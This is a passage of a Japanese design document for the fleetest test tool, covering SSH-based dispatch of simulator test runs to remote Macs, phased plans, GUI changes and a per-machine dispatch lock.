| **初回/2回目以降の所要**(Phase 1 ゲート) | 初回 **95秒**(リモートビルド+ブリッジ供給込み)/ 2回目 **10.8秒**(ブリッジ温存・増分ビルド)。コールドは初回だけで、実用に耐える |
| キャンセル伝播(`-tt`) | ✅ 実証。`-tt` ありはローカルの ssh を kill するとリモートのプロセスも消え、**`-tt` なしは残る**(対照実験) |
| `api run --runner` の NDJSON 中継(拡張経路) | ✅ 成立。stdout は全行が妥当な NDJSON・リモートの診断は stderr へ(`-tt` による合流を中継側で振り分け。§12) |
| `--remote-timeout` の実発火 | ✅ 実証。期限で打ち切られ、**リモートのプロセスも残らない**(SIGTERM→SIGKILL が届く) |

**設計への影響**: §5 が前提にしていた「Background セッションでは iOS シミュレータが動かない」は
**この構成では誤りだった**。**コンソールに誰かがログインしている(Aqua セッションが存在する)限り、
SSH 側のプロセスからでもユーザーの launchd ドメインのサービス(CoreSimulator 等)に到達できる**。
したがって:

- **`--remote-session` を撤去**(選択肢が1つなのでオプション自体を持たない)
- **§16.3 のログイン状態チェック(console user)が唯一の実効的な前提**になる。
  「Aqua セッションが**存在する**こと」が要件で、「ディスパッチされたプロセスが Aqua の**中にいる**こと」は不要
- Phase 2 の session agent は**当面不要**(asuser 不成立時の代替として計画していたが、直接実行で足りる)

### 未実施の実験

**実験4回に束ねてある**(項目ごとに別実験を組まない。1回の実験で複数項目が同時に判明する):

| 実験 | 一度に判明する項目 | 手順 |
|---|---|---|
| **① localhost 素振り**(要 sshd 有効化)**= 実施済み。上の結果表を参照** | 到達経路の成否 / ディスパッチの体験成立(転送→実行→回収)/ 遠隔での flake 診断コスト | localhost へ SSH して run を1本通し、成果物回収と、失敗時にレポートだけで切り分けられるかを見る |
| **② 画面ロックしたまま run 1本** | FM のロック中挙動 / **XCUITest・シミュレータ・録画のロック中可否**(§5 の2モード共通の前提) | ロック状態で run を通し、あわせて `doctor --fm-only` を反復(availability は嘘をつくので実呼び出し)。不可なら「ロック無効」をランナー要件に戻す(FileVault は維持できる) |
| **③ `fdesetup authrestart` 1回** | 対象機(Apple silicon・当該 macOS)で使えるか | 実行して、再起動後にボリュームが解錠され loginwindow まで来ることを確認 |
| **④ Android の SSH 実行 = 実施済み(2026-07-31)** | ヘッドレス起動 / gRPC 制御 / シナリオ実行 | **§6 に結果を記載**。`-no-window` は元から既定だったため「ヘッドレス化の可否」ではなく「SSH セッションから動くか」を実測した |

## 10. 作業計画

各 Phase の末尾が判断ゲート。**Phase 0 で需要または体験が成立しなければ中止**(以降を作らない)。

**進行の実際(2026-07-31)**: ユーザー判断により **Phase 0 を実施しないまま Phase 1 を
実装済み**(§12)。**§9 の実験①は 2026-07-31 に実施済み**で、到達経路は確定した
(asuser 撤去・SSH セッションで直接実行)。残る未実施は実験②〜④(画面ロック中の挙動・
`fdesetup authrestart`・Android `-no-window`)。

### Phase 0: 素振り・検証(実装なし)

- 手動 SSH で隣の Mac へ run を投げる(転送→install.sh→run→回収を手作業)
- §9 の実験4回を実施(①が最優先 — 到達経路を決める。**①は実施済み**)
- **ゲート**: 対話的分散・共有の需要が実在するか/ジョブ粒度の体験が成立するかをユーザーが判断

### Phase 1: `fleetest run --runner <mac>`(単一リモート・ジョブ粒度)

- 適合チェック(§7)・rsync 転送・リモート実行・出力ストリームバック(§3 の用途分け)・
  成果物回収(JUnit の `report:` パス書き換え含む)
- Aqua への到達は Phase 0 で成立を確認した経路を使う(**確定: SSH セッションで直接実行**)
- 純粋ロジック(適合判定・転送対象の算出・回収パス書き換え)は切り出して単体テスト。
  SSH 越しの結合は E2E に残す
- 新スクリプト/サブコマンドを足したら Bash 許可リストにも足す(承認3方向の②)
- **ゲート**: 実デバイスの run 1本が手元 CLI から見えて成果物が開けること。
  加えて**2回目以降のディスパッチ所要(転送+増分ビルド)を計測**し、体験成立の
  判断材料にする(コールドビルド数分は初回のみか、を確認)

### Phase 2: session agent 常設化 + 運用ドキュメント

- LaunchAgent 版 session agent(受けて spawn して中継するだけ+**ジョブ直列化**[§5])
- **control(Background)→ execution(Aqua)の受け渡し IPC をここで決める**
  (候補: スプールディレクトリ監視 vs localhost ソケット。設計判断として記録する)
- ランナー機セットアップ手順の文書化(§14 のモード A/B・LaunchAgent・§15 の
  セキュリティ注意)。ci.md のランナー前提と整合させる
- **ゲート**: 再起動後(モード A は解錠+ログインの後・モード B はゼロタッチで)、
  人手なしで受付可能に戻ること。同時ディスパッチ2本が直列化されること

### Phase 3: マルチマシン分散

- `RunOrchestrator` worker のマシン跨ぎ拡張・results DB マージ・JUnit 集約
- ToolchainFingerprint によるフリート適合チェック(不適合機は除外して警告)
- **ゲート**: 2台分散で壁時計が短縮され、失敗レポートが手元から辿れること

### Phase 4(任意): Android ヘッドレスレーン

- §6 の採用条件2つが実測で成立した場合のみ。ディスパッチの振り分け(対象 OS・FM 使用)を追加

## 11. GUI(vscode-fleetest モニター)への影響

リモートデバイスをローカルと混在表示する場合に必要になる機能。優先度は Phase 対応表(末尾)。

### マシン軸の導入

- デバイスモデル(monitorDeviceModel)に **host 属性**を追加し、タイルをホスト別に
  グルーピング+ホストバッジ表示。**デバイス名は全 Mac で衝突する**(どのマシンにも
  「iPhone 17」がいる)ため、名前だけの識別は混在時点で成立しない
- hostCharts(負荷チャート)はローカル1台前提 → ホスト別の行に分割
- machines プロファイルの表示・編集は「どのマシンの」の次元が増える

### ホスト状態(デバイス状態の上の新しい階層)

- 到達可能 / SSH 不可 / session agent 不在 / 版スキュー(rev・Toolchain・Protocol)/
  FM 可否 をホストヘッダに表示(compatCheck / protocolVersion の照合をホスト単位へ拡張)。
  §7 の fail fast の理由を GUI で見せる場所
- ランナーの更新は実行前の版ズレダイアログの「更新して実行」(= `fleetest remote align`。
  `vscode-fleetest/src/runHandler.ts`)。設定タブに「このホストを更新」の UI は無い
- FM 可否(`doctor --fm-only` 結果)はホスト別に常設表示(screenLooksLike を含むスイートの
  振り分け判断に直結)

### ストリーミングの帯域制御と stale の意味論変更(最重要)

- リモートタイルの既定は低 FPS/静止サムネイル、**選択時のみライブ化**(可視タイルのみ配信)。
  H.264 全タイル常時配信は LAN 帯域で成立しない
- **フレーム経過秒をタイルに表示**。「古いフレーム」の原因が
  デバイス凍結([[emulator-display-freeze-wedge]] の既知の罠)とネットワーク遅延の
  2値になり、表示なしでは切り分け不能
- **watchdog の分界(後付け不可)**: 凍結検知(monitorHealthWatchdog)は
  「フレーム不変=デバイス凍結」前提。リモートではリンク切れでも同じ見え方になるため、
  **ホスト到達性を先に判定してからデバイス凍結と診断する**。入れないとネットワーク瞬断の
  たびに sleep/wake 修復が誤発火する。リモートタイル表示開始(Phase 3 の頭)までに必須

### run レーンとディスパッチ

- レーンにホスト帰属を表示(NDJSON にホストを乗せて流す。JUnit の worker と対応)
- 実行開始 UI に発行先の選択(特定ホスト/自動分散)
- 罠: runLaneModel/runReducer は両バンドル共有 → 新規表示文字列は
  `i18n/strings/lane.ts` のランタイム側(既存の i18n 制約)

### 共有ラボの占有表示とガード

- 占有の表示(どのデバイスが**どの run に使用中か**)。複数人共有では占有が見えないと
  相乗り事故になる([[avoid-driving-monitor-owned-devices]] の一般化)。
  **「誰の」は出さない** — 全員が同一ユーザーで入る構成では帰属を取れないため
  (§15.3 で「同一信頼グループ限定」を既定と決定済み。実装が1本減る)
- リモートへの `devices down` 相当は他人の run を殺し得る → ホスト側
  `showWarningMessage({modal:true})` で確認(webview の `window.confirm` は効かない)+
  「自分が起動したものだけ」オプション
- **作らない**: リモートタイルからの対話操作。モニター=受動ビューアの決定を維持

### 成果物・ログ・プロセス管理

- レポート・録画リンクはリモートパスを指す → **クリック時に回収してから開く**
  (録画は大きいのでオンデマンド+withProgress)。実行ログは OUTPUT へ(ホスト別
  チャンネル or 行プレフィクス)
- processesTab / orphanSweep はローカルプロセス走査前提でリモートに適用不能。
  リモートは session agent 経由の状態表示だけにし、**効かない kill ボタンを出さない**。
  掃除はリモート側 fleetest の責務

### Phase 対応

| 段階 | 必要になる GUI 機能 |
|---|---|
| Phase 1 | ほぼ不要(CLI 完結)。あるならレーンのホスト表示・成果物のクリック時回収 |
| Phase 2 | ホスト状態表示・設定タブのホスト一覧/更新・FM 可否表示 |
| Phase 3 | タイルのホスト別グルーピング・帯域制御・**watchdog 分界**・占有表示・ディスパッチ UI |

## 12. Phase 1 実装メモ(2026-07-31)

`fleetest run --runner <user@host>`(`--profile` 必須。`--port`/`--report-dir`/`--failed`/
`--skip-build` は併用不可)・`--remote-dir`(既定: ローカルルートと同じ絶対パス)・
(`--remote-session` は asuser 撤去に伴い廃止)。純粋ロジックは
`Sources/FTRemote/RemoteDispatch.swift`(単体テスト対象)、プロセス起動は
`Sources/fleetest/RemoteRunDispatcher.swift` に集約。

設計文書からの意図的な逸脱:

- ~~リモートは clone 構成前提~~ → **撤回(2026-07-31)。§3 どおりの外部構成に戻した**。
  clone 構成のままだと**ローカルインストール済みマシンと干渉する**(実害3件: rsync
  `--delete` が相手の `Scenarios`/`profiles` を消す・レポート回収が相手のローカル実行分まで
  引き込む・クローンと `.build` の共用で SPM ビルドロック競合と results 混在)。
  現在は**リモートに専用ベースディレクトリ1つ**(`--remote-dir`。既定 `~/fleetest-runner`)を
  置き、その配下で完結させる:

  ```
  <base>/          ← --remote-dir(既定 ~/fleetest-runner。チルダは $HOME で解決)
  ├── tool/        ← TOOL_ROOT(ランナー専用クローン)。バイナリは tool/.build/debug/fleetest
  └── work/        ← WORK_DIR(受け手パッケージ。TestProjects・results・.build)
  ```

  実行は `cd <base>/users/<issuer>/work && <base>/foundation-tester/.build/debug/fleetest …`。`packageRoot()`(cwd から
  Package.swift を探す)が work を、`RepoRoot.find()`(実行バイナリの位置)が tool を
  独立に解決するため、**既存の外部構成の仕組みでそのまま成立する**(新しい解決規則を
  作っていない)。マシン自身の `~/foundation-tester` や `TestProjects/` には一切触れない
- アプリバイナリは転送しない(rsync 対象はシナリオ・プロファイルのみ。dispatch 開始時に
  注記を1行出す)。appPath はリモート側で有効なパスであることが前提
- results DB の**マージ**(ローカルの集計に混ぜる)は行わない(Phase 3 の課題)。**録画と run ログ
  (`results/` 配下)は run のたびにローカルの `TestProjects/<name>/results/` へ rsync で回収する**
  (**`--delete` は付けない** — ローカルで別に走った run の results を巻き添えで消さない。
  差分転送なので再ディスパッチは安い)。回収しないと LPT(投入順・フリート割り当て)が
  リモートで走ったシナリオを永久に「実績なし」として扱う。
  拡張連携(`fleetest api run` の NDJSON 中継)は §12 末尾のとおり後日実装
- **レポート回収はディスパッチ単位に隔離**(2026-07-31)。run に
  `--report-dir <base>/users/<issuer>/work/.fleetest/dispatch/<stamp>/reports` を内部で渡し、
  **そのディレクトリだけを回収して、回収後にリモートから削除**する
  (リモートの `reports/` を丸ごと引くのをやめた。相手の無関係な実行分・録画を
  引き込まないため。ユーザーの `--report-dir` 併用は引き続き不可 = 内部で使うため)

**localhost E2E で見つかり修正した実装上の罠(2026-07-31。いずれも単体テストでは出ない)**:

- **クローンのディレクトリ名は `foundation-tester` 固定**(`<base>/tool` にしていた)。SPM は
  パス依存のパッケージ名を**ディレクトリ名から導出**するため、受け手 Package.swift の
  `package: "foundation-tester"` と一致せず `unknown package` でマニフェストが壊れた
- **非対話 ssh の PATH は `/usr/bin:/bin:/usr/sbin:/sbin` だけ**で Homebrew が入らない。
  `node` 等が見えず落ちるため、リモートコマンドの先頭で
  `export PATH="/opt/homebrew/bin:/usr/local/bin:$PATH"` を明示する
- **ランナーの WORK_DIR には受け手パッケージ(Package.swift)が必要**。`install.sh --skip-project`
  は Package.swift 自体を作らないため、`remote setup` は**プロジェクト名を渡して**導入する
  必要がある。さらに**ディスパッチの rsync が先に `TestProjects/<name>/` を作ると
  install.sh のプロジェクト作成がスキップされる**(ディレクトリ存在で判定するため)ので、
  導入はディスパッチより前に済ませる
- `remote clean` の `devices down` も同じ経路で実行する(リモートの fleetest を直接叩く)
- **`ssh -tt` はリモートの stderr を stdout に合流させる**(擬似 TTY は1本の流れ)。
  `api run --runner` の stdout は NDJSON 専用の契約なので、**中継側で行を振り分ける**
  (JSON 行 = stdout / それ以外 = stderr。`RemoteRelay.isMachineReadableLine`)。
  入れないとリモートの人間向け診断が NDJSON に混入する(2026-07-31 実測・修正済み)

適合チェックは git revision + `ToolchainFingerprint`(`compose` をローカル/リモート両方が
共有し、合成規則の drift を防ぐ)の2項目。`ProtocolVersion` は独立して照合しない —
CLI 中継(`fleetest run` の起動)のみが対象で、rev 一致(= 同一 upstream コミット)に
包含されるため

`fleetest api run --runner` を実装(拡張連携用の NDJSON 中継。人間向け進行は stderr・NDJSON は
stdout を行単位でリモート→ローカルへパス書き換えして中継)。`--interactive`(`--debug`)/
`--breakpoint`/`--dry-run` 等の stdin 制御・ローカル専用系は併用不可。`ProtocolVersion` は
不変(NDJSON の形を変えていない)。

GUI(vscode-fleetest)は単一ホスト設定ではなく**複数ホスト登録+実行先選択**にした:
`fleetest.remote.hosts`(name/host/dir/session の配列。name は実行先セレクタの一意キー)と
`fleetest.remote.target`(空 = ローカル、非空 = hosts の name に一致するディスパッチ先)。
target が hosts に無い/host 未設定を指す場合は**黙ってローカル実行にフォールバックせず run を
中止する**(fleetest の resolveRemoteTarget。Fleetest.swift / ApiRunCommand.swift)。同一リモートへの同時ディスパッチはまだ
直列化していない(Phase 2 の課題のまま)。

> **2026-08-17 に実行先セレクタは廃止**(§13 の実装で確定した点を参照)。`fleetest.remote.target`
> という設定キーはもう無く、ディスパッチ先は**実行プロファイルの devices が持つ `machine`**
> (デバイスごとに直接指定)で決まる。登録簿は LocalConfig へ移り、`fleetest.remote.hosts` も
> 設定キーとしては存在しない(設定タブは `fleetest api remote-machines` を読み書きする)。
> `fleetest.remote.*` 形の設定キーは無い。

## 13. フリート実行と多ホスト GUI(**段1〜段4は実装済み**。段5 は状態・映像とブリッジ
watchdog の分界まで実装済みで、残るのは健全性 watchdog の分界)

**実装済み**: 登録簿の LocalConfig 移行(段1。`fleetest remote machines` / `--runner <登録名>` /
`api remote-machines` / 拡張の移行)・フリート定義と `run --fleet`(段4)・実行先重複の拒否・
**同一リモートへの二重ディスパッチのロック**(§5 の直列化に相当。ただし待たずに fail fast)。
実機2台(M1Ultra + M1Max)で一斉実行と混在(`local` + リモート)を実走確認済み。
**results の集計は最初から成立していた**(下記。マージの実装は不要だった)。
**シナリオのホスト間分散も実装済み**(`--split`。§8)。
**段2(GUI からのホスト指定)は 2026-08-17 に形を変えて決着**(下記「GUI のホスト指定は
実行プロファイルのデバイスへ集約した」)。
**未実装**: appPath の ssh 実在チェック(段3)。ただし**元の動機だった appPath の解決ずれ
(相対パスの基準ディレクトリ違い・パッケージが転送対象外)自体は §17 の
`remoteControl.workspace` で解消済み**なので、着手するなら残っている失敗の形を先に確かめる
(下記「アプリプロファイル」)。段5(「デバイスモニター」タブの多ホスト化)は
**状態・静止画・ライブ映像まで 2026-08-17 に実装**(下記「リモートのデバイスの状態と画面」)。
残るのは健全性 watchdog の分界(ブリッジ watchdog は 2026-09-25 に分界済み)。

**NDJSON 多重化はライブ配信(2026-08-18)**: `ApiRunMachineFanout` の `MachineFanoutMultiplexer` は
以前 workersReady が全子ぶん揃うまで全イベントをバッファしていた(リモート機の準備待ちで
ローカル分の表示が最後に一括更新される)。今は**バッファせず即時中継**し、workersReady は
**子ごとに届くたび、その時点で判明している全ワーカーの累積で再送**する。子が担当シナリオを
残して終了したら、そのシナリオを failed の合成イベントとして報告する(沈黙のまま
「走っていない」にしない)。

### host はデバイス単位・1つの実行プロファイルが複数の機械にまたがれる(2026-08-17)

**一意なのは name 単体ではなく (machine, name)**。フリートの各機は同じ命名規則でシミュレータを
作るので、別ホストの同名は例外ではなく通常 —— これを重複として拒否すると
「ローカル10台 + リモート10台」を1つのプロファイルに書けない(利用者の指摘で判明)。

- 各デバイスの `machine` が**そのデバイスの居場所を直接言う**(正規化は
  `FTCore.DeviceMachineGrouping` / `MachineDispatch.normalize` —— 省略・空文字・`"local"` は
  どれも「手元」に畳む)。1台ごとに書くので、他のデバイスの値を引き継ぐような既定は無い
- **実行はホストごとのサブ実行へ分かれる**(`Sources/fleetest/DeviceMachineRunner.swift`)。
  子プロセスの起動・行の前置・JUnit 結合・集計は FleetRunner のヘルパを共有し、
  シナリオの割り当ては `FleetSplit.partition` に**台数の重み**(`entryCapacities`)を渡して行う ——
  総量で均すと台数の少ないホストだけが最後まで残り、壁時計が縮まない。
  子には `--device <名前…>` と `--runner <ホスト|local>` を渡す
- **`--runner` 明示は分散より強い**(「今回はこの機械で」の意味。MachineDispatch と同じ規律)
- **`--runner H` に明示の `--device <名前>` を付けたら、名前は H のデバイスに限定する**(2026-08-24。
  `RemoteDispatchExplicitDeviceScope`)。混在プロファイルでは同名のデバイスが複数の機械にあるので、
  名前だけを子へ渡すと**全機械ぶんの同名を拾い**、手元の UDID をランナー機で探して
  `no simulator with that UDID` で落ちた(受け手報告 2026-08-23: local/M1Max/M1Ultra の同名
  iPhone で `--device` 1台 → Devices に3台)。子には `--device-machine M` を付けて渡し、
  名前が H に無ければ**H のデバイスを列挙して手元で止める**(遠い失敗にしない)。別の機械の同名を
  指したいときは `--device-machine` を明示する。machine 未指定のプロファイルは従来どおり名前を素通し。
  **`--runner` も `--device-machine` も無い `--device` は、名前が2つ以上の機械に当たれば実行前に断る**
  (`run` / `api run` の2経路。全部の機械で回すのは `--all-machines` で明示。`--runner`・`--device-machine` とは
  併用不可)。以前は名前が当たる全機械で黙って回り、「手元の1台で試す」つもりがリモート機まで動いた ——
  デバイス操作の `findDevice` が `.ambiguous` で断るのと同じ慣習に揃えた。**子のサブ run は必ず `--runner` と
  `--device-machine` を付けて起こすので、この判定に掛からない**
  **`--runner local` も同じ判定を通す**(2026-08-24。`run` / `api run` の2経路。手元実行だからと
  素通しにすると、名前が別ホストのエントリに解決して手元でそのホストの UDID を探し
  `no simulator with that UDID` で止まる — 受け手報告)
- **`api run`(拡張の実行経路)も混在プロファイルを扱う**(`ApiRunMachineFanout`)。機械ごとに
  `api run --runner <機械> …` の子へ分け、NDJSON を1本へ多重化する(`MachineFanoutMultiplexer`)。
  レーンの識別子はホスト付き id(`DeviceMachineGrouping.workerID`)へ書き換えてホストを跨いで一意にする

**この作業でリモート実行の欠陥が1つ出た(修正済み)**: `RemoteRunArgs.build`/`buildApi` が
リモートへ `--runner local` を渡していなかったため、実行プロファイルのデバイスに `machine` が
書いてあると**リモート側の fleetest が自分自身へ再ディスパッチしようとする**(登録簿に無ければ
「未登録のホスト」で落ち、あれば自分へ ssh する)。`FleetRunner` が "local" エントリに
`--runner local` を渡すのと同じ理由で、リモート側は常にそこで止める。

### GUI のホスト指定は実行プロファイルのデバイスへ集約した(2026-08-17)

段2 は当初「マシンプロファイルタブに取得元セレクタを置く」形で実装したが(2026-08-16)、
**実行先の指定が設定タブ(実行先)とプロファイルタブ(取得元)の2箇所に分かれ、
どちらが実際のディスパッチ先を決めるのかが利用者から見えなかった**。現在の形:

- **実行プロファイルの devices が `machine` を直接持つ**(各デバイスエントリ直下の
  `"machine"`。省略・空・`"local"` = ローカル)。ディスパッチ先はデバイスそのものが言うので、
  仲介するファイルは無い(直接指定)。ssh の実体は書けない = 登録名(エイリアス)だけ(§0 の規律3)
- **`--runner`(登録名またはホスト名・IP)は上書きとして残す**(CLI と自動化向け。
  マシン名・生のホスト値のどちらも受ける単一の口)。優先順位・食い違いの扱いは
  `FTCore.MachineDispatch`。**明示 `--runner local` は「ここで走らせる」であって未指定ではない**
- **設定タブの「実行先」は廃止**。設定タブが持つのは**登録簿(名前 → ssh 宛先)だけ**
- **「取得元」の概念も廃止**。デバイス候補をどのマシンから採るかは
  **「デバイスを選択」ダイアログのマシン選択**(`#device-pick-machine-select`)で決め、
  選んだマシンがそのまま実行プロファイルへ書き込まれるデバイスの `machine` になる。
  **取得元と実行先が別々に設定できてしまう状態を作らない**
- デバイス一覧の行は**右クリックで実体を削除できる**(`fleetest api delete-device`。
  判定は `FTCore.DeviceDeletion` — 起動中は削除しない・存在しない識別子を「削除できた」と
  言わない・同じ (platform, machine, name) を共有する他の実行プロファイルへの影響は
  `referencedBy` で申告する)

複数のリモートホストとローカルで**一斉に**実行するための設計。2026-07-31 レビュー済み
(指摘の反映内容は各所に付記)。

### 原則: プロファイルの正はローカル・実行時に配布

apps/runs はプロジェクト資産で、ディスパッチのたびに rsync でリモートへ届く。
よって**リモート機のプロファイルもローカルのファイルを編集すれば次回実行で反映される**。
実行プロファイルに host(ssh 実体)は埋めない(転送資産に実体を混ぜない。
「名前(machine)はプロジェクト資産・実体(host)はローカル設定」という分離を保つ)。
**さらに転送時には machine(エイリアス)も
落とす** —— ランナーが受け取るのは「そのランナーから見た姿」で、自分のデバイスは `machine: "local"`
になっている(§0 の規律1。`FTCore.RunnerProfileView`)。

### フリート定義

```jsonc
// profiles/fleets/<name>.json(プロジェクト資産・論理名のみ)
{ "runs": [
    { "host": "local",      "profile": "ios-1" },
    { "host": "mac-studio", "profile": "all" } ] }
// ※ ここの "host" は**登録名(エイリアス)**を取る旧来のキー。§0 の用語では machine に当たる
//    (改名は未実施。実装するときは旧キーを読めるまま "machine" を正にする)
```

- CLI: `fleetest run --fleet <name>` が全エントリを並行起動(local はローカル実行)。
  集約 exit code。エントリごとに JUnit/レポートは従来どおり
- **machine(登録名)は任意**(2026-08-27)。空欄なら `host` のホスト部(`user@` を落とした
  ホスト名 / IP)をそのまま名前にする(`RemoteHostRegistry.defaultMachine(forHost:)`。
  拡張の入力欄はその名前をウォーターマークで先に見せる —— 規則が割れると画面が予告した名前と
  実際に登録される名前が食い違うので、`vscode-fleetest/src/remoteRunArgs.ts` の
  `defaultMachineForHost` と対にしてテストで縛る)。**エイリアスはこの Mac だけのものなので、
  名前を付けたくない利用者に付けさせない**。`host` は宛先そのものなので省略できない
- **ホスト登録簿(論理名 → ssh 実体)は LocalConfig(`~/.config/fleetest/config.json`)に
  置く**。理由は2つ: ①CLI が解決の主体になるため VSCode 設定では読めない、
  ②**リポジトリ由来の設定(`.vscode/settings.json`)がディスパッチ先を差し替えられなく
  なる**(§15。VSCode 設定は window スコープ既定でワークスペースから上書き可能)。
  §12 の `fleetest.remote.hosts`(VSCode 設定)は**この段階で LocalConfig へ移行**し、
  設定タブは CLI 経由の読み書きに変える。移行までの暫定対処は §15
- 登録簿エントリのキーは `machine` / `host` / `dir` / `fmConcurrency` / `color` / `enabled` /
  `developerDir`(`FTCore.RemoteHostEntry`)。リモートのマシン登録名はキャッシュも照合も持たない
  (適合チェックは rev と toolchain の2項目。§7)
- ガード: フリート内の実行先重複は編集時に拒否(同一リモート二重ディスパッチの
  デバイス競合)。`"local"` と空文字は登録簿の予約名。target/host が解決できない
  エントリは**黙ってローカルで走らせず中止**。シナリオフィルタ指定時、あるエントリで
  0 件マッチはそのエントリを skip、**全エントリ 0 件は中止**

**実装で確定した点(2026-08-16)**:

- **フリート定義に生の ssh 宛先は書けない**(`"local"` か登録名だけ)。プロジェクト資産に
  ssh の実体を混ぜない
- **validate は問題を全部まとめて返す**(最初の1件で止めない)。フリートは定義を直す →
  再実行の往復が長いので、1回で全部見せる
- **集約 exit code は 1 に潰さず非0の最大**を返す。「リモートにバイナリが無い(90)」のような
  区別できる信号を呼び出し側へ残す
- **ローカルエントリも子プロセスで起動する**(`fleetest run --profile …` を spawn)。
  行ごとの `[host] ` 前置を、ローカル実行の深い呼び出し連鎖にも一様に掛けるため
- **`--scenario` の 0 件 skip は実装していない**。フリートは1プロジェクトに閉じており、
  エントリごとにシナリオ集合が変わらないので「このエントリだけ 0 件」は起き得ない
  (`--folder` は存在チェックだけ先に行い、全滅ならディスパッチ前に中止する)

### 二重ディスパッチのロック(§5 の直列化。実装済み)

フリート内の重複は validate で防げるが、**別プロセス・別人・CLI と GUI の併走**は防げない。
**`$HOME/.fleetest/dispatch.lock`**(機械グローバル)を **`mkdir` の原子性**で取る
(`test -e` → 作成の2段は競合に対して無意味)。**フリート専用にしない** —— 同一ホストの
取り合いは `--runner` 単発でも起きるので、ディスパッチ経路そのものに置く。

**`<base>` の下に戻さない**: 守っているのは**マシンの資源**(デバイス・`CoreSimulatorService`・
loopback のポート)で、`<base>` 配下だと**同じ Mac に base が2つあるとロックが割れる**のに
取り合う相手は同じ(`testTwoBasesOnTheSameMachineShareOneLock` が固定)。場所の定義元は
`FTCore.MachineStateDirectory`(run ボードの台帳・FM の控えと同じ機械グローバル区画)。
**`$HOME` は ssh の1往復で確定した値を `RemoteLayout.home` が運ぶ** —— 取得・解放に
`"$HOME/…"` の遅延展開を書かない(展開がロックの同一性を壊しうる)。例外は
`remote status` の並列プローブだけで、あちらは**読むだけで取らない**

**ローカル run も同じロックを取る**(2026-09-21 ユーザー決定「**1つのマシンで同時に複数の run を
実行することは想定していない。高負荷になりすぎてテストが不安定になる**」)—— これは避けたい
副作用ではなく**守りたい不変条件**で、ツールが構造的に守る。以前は手元の run がロックを
取らなかったので、**他人がその Mac をランナーとして登録していると、他人のディスパッチと同時に
走ってデバイスとポートを奪い合った**(run-lease も `ProvisionLock` もツールのクローン配下 =
別ルートなので、どちらの門もすり抜ける)。守る規律6つ:

- **取得の実装を増やさない** —— `LocalDispatchLock` はコマンド文字列を書かず、
  `RemoteDispatchQueue` が作る**リモートと同じシェル片**を `/bin/sh -c` で撃つだけ。解析も
  `parseOutcome`、待つ判断も `WaitLockPolling` を共有する
- **取るのは run の入口**(`RunScenarios.run` / `ApiRunCommand.run`)で**ビルドにもデバイスにも触る前**
  (`swift build` 自体が重い負荷なので直列化する)。**`--dry-run` は取らない**
- **回収は pid だけで決める**(`RemoteDispatchUnlock.decideLocalSweep`)—— リモートの裏取り
  (`liveDispatchedRunsCommand` の pgrep)は手元の run を見つけられず、掛けると答えが常に
  「確かめられなかった」= 外さない側へ倒れて**死んだロックが永久に残る**。同じ機械の pid は確定でき、
  **リモートの裏取りより強い**。**他人がここへ置いたロックは外れない**(控えの issuer が違う)
- **ランナー機で自壊させない** —— ディスパッチ先の `fleetest run --runner local` は**向こうから見れば
  手元の run** なので、発行側が握っているロックを自分で取りに行って詰む。`remoteRunCommand` が
  `FT_DISPATCH_LOCK_HELD='local'` を export して止める(**`remoteExecCommand` には置かない**)
- **dispatch.lock(マシン全体)と run-lease(デバイスごと)の上下**: 「マシンの門 → デバイスの門」。
  **MCP の印と `start-device` 等は dispatch.lock を取らない**のでデバイスごとの調停は run-lease に残る。
  **例外は `rejectIfLocalDevicesLeasedBeforeDispatch`** —— 読み取りの先読みで、**どのロックも取る前に
  断る**ために手前にある(取ってから降りると他人を待たせた挙句に何も走らない)
- **fan-out は手元の枠も全順序に入れる**(手元だけ外すと循環が復活する。§18.10)
- **純リモートの run は手元のロックを取らない**(`--runner <machine>` / 全台がリモートのプロファイル)
  —— 手元のデバイスを1台も使わないので占有する理由が無い。ディスパッチの分岐が run 本体より
  手前で return するので、取得はそもそも通らない(実測で確認済み)

**挙動が変わる点**: ①同じ Mac の2本目の run は即座に断られる(`--wait-lock <秒>` で並べる)
②拡張から押した run と CLI の run も互いに排他する ③**`--wait-lock` がどの run でも打てる**
(以前はプロファイル / `--runner` / `--fleet` のどれも無いと「待つ相手が居ない」として弾いていた)
④待っている間は run ボードに載らない(記帳より前に取るため。待機は端末 / OUTPUT のログと、
`api run` なら `dispatchWaiting` = 実行ログビューの全体レーンに出る)。
**MCP(`ft_*`)は dispatch.lock を取らない** —— プロセス内で `ScenarioHost.run` を直接呼ぶ別経路で、
デバイスごとの MCP の印 + run-lease が唯一の調停。「1 run/マシン」を MCP まで広げるかは未決

**受け入れている限界(2026-09-21 のレビューで洗い出した4つ。4 は同日に塞いだ)**:

1. **握ったあとの Ctrl-C でロックが残る** —— 待っている間だけ `InterruptRelay` を張り、**握ったら
   外す**。張り続けると run 自身の中断ハンドラ(`RunInterruptState`。供給の**後**でしか立たない)
   までの間、**供給中の Ctrl-C が黙って無視される**ため。残ったロックは次の run が pid で回収し、
   他人も `unlock --runner local` で外せる。「Ctrl-C が効かない」より「回収が1回挟まる」を選んだ
2. ~~手元の死んだロックを外す専用の口が無い~~ → **`fleetest remote unlock --runner local` で
   外せる**(2026-09-21。新しいコマンドも新しい判定も足していない。詳細は下の unlock の項)
3. **MCP(`ft_*`)は dispatch.lock を取らない**(**広げない。再提案しない**)—— 守っているのは
   「高負荷による不安定化」で、MCP は run ではなく**対話的な操作**(1手ずつ)なので負荷の性質が違う。
   広げると**エージェントがデバイスを1つ触るだけで run が一切走らなくなる**。デバイスの取り合いは
   `ProfileRunner.limitingDevicesAvoidingMCP` で足りている。**再検討条件**: `ft_run_scenario` が
   run と同じ重さの負荷で実際に不安定化させたとき
4. ~~**手元の待機は NDJSON に出ない**~~ **塞いだ(2026-09-21)** —— 手元のロックを待っている間も
   `dispatchWaiting` を出す(`machine` は `"local"` = `DeviceMachineGrouping.localDisplayName`。
   新しい綴りを作らない)。出すのは **`fleetest api run` の経路だけ**(`fleetest run` の stdout は
   人間向け)で、**ログと同じ刻みの式を1つ**通す。組み立ては
   `ApiDispatchWaitingEvent.emit` の1箇所をリモートと共有する。**`ProtocolVersion` は上げない**
   —— 欄の集合も型も変わらず、既存の欄に取りうる値が1つ増えるだけで拡張の読み方
   (decode・`laneIdOf`)は変わらない。拡張は `"local"` だけを表示名へ読み替える
   (`i18n/strings/lane.ts` の `dispatchWaitingLine` の1箇所。呼び名は
   `deviceOps.machineLocalLabel` = 「ローカル」/ "the local machine" と同じ1つ)

- 取れなければ**待たずに fail fast**(exit 1)。誰がいつから掴んでいるかを出す
  (issuerId 付き。§18.2)。**`--wait-lock <秒>` で解放待ちのポーリングに切り替えられる**
